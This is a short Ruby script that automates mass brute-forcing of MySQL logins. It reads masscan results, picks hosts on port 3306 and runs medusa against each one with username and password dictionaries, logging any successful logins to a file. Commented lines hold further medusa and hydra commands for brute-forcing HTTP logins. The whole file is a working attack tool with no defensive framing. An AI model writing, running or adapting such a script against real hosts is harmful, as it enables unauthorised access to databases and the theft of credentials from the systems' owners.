#!/usr/bin/env ruby

#medusa -M http -h 10.99.184.116 -n 8888 -U ../../develop/masport/db/dict/user.txt -P ../../develop/masport/db/dict/pass.txt
#hydra -t 64 -V -L ../db/dict/user.txt -P ../db/dict/pass.txt -M ../db/hydra/url.txt http-get
input = '../db/masscan/ips.1435007435'

File.open(input).each do |line|
  next if !line.include?('3306')
  result = ''
  arg_path = '-m DIR:manager/html/'
  line.chomp!
  ary = line.split ':'
  ip   = ary[0]
  port = ary[1]
  if ip and port
    #puts line
    cmd="medusa -e ns -t 64 -w 1 -v 4 -M mysql -h #{ip} -n #{port} -U ../db/dict/user.txt -P ../db/dict/pass.txt #{arg_path}"
    puts 'Running syscmd: '+cmd
    result = `#{cmd}`
    if result and result.include? '[SUCCESS]'
      File.open('../db/medusa/mysql_result.txt', 'a') { |file| 
        file.write(cmd)
        file.write(result) 
      }
    end
    puts result
  end

end

